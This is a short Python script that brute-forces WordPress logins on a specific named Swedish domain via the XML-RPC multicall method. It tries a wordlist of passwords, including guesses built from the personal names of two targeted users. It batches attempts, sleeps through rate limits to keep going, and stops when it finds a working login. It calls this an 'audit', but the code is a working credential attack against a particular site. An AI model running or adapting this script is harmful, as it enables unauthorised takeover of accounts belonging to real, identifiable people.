import xmlrpc.client
import time

url = "https://doktorbajskorv.se/xmlrpc.php"
users = ["nalle", "lompa"]

passwords = [
    "password", "secret", "123456", "nalle123", "lompa123", "bajskorv", "admin", "admin123",
    "nalle", "nalle1", "påhlsson", "pahlsson", "nallepahlsson", "nallepåhlsson", "nallan", "bear",
    "lompa", "lompa1", "thomas", "andersson", "thomasandersson", "lompathomas"
]

def chunk_list(lst, n):
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

proxy = xmlrpc.client.ServerProxy(url, allow_none=True)

for user in users:
    print(f"\n[*] Starting native multicall audit for user: {user}")
    for batch in chunk_list(passwords, 5):
        try:
            multi = xmlrpc.client.MultiCall(proxy)
            for pwd in batch:
                multi.wp.getUsersBlogs(user, pwd)
            
            results = list(multi())
            for idx, res in enumerate(results):
                pwd_tested = batch[idx]
                if isinstance(res, xmlrpc.client.Fault):
                    print(f"[-] Failed: {user}:{pwd_tested} (Fault {res.faultCode})")
                else:
                    print(f"\n[+] SUCCESS! Credentials found -> {user}:{pwd_tested}")
                    exit(0)
                    
        except xmlrpc.client.ProtocolError as e:
            if e.errcode == 429:
                print(f"[!] Rate limited (429). Sleeping for 10 seconds...")
                time.sleep(10)
            else:
                print(f"[!] HTTP Protocol Error {e.errcode}: {e.errmsg}")
        except Exception as e:
            print(f"[!] Error: {e}")
        
        time.sleep(2)

print("\n[*] Audit completed.")
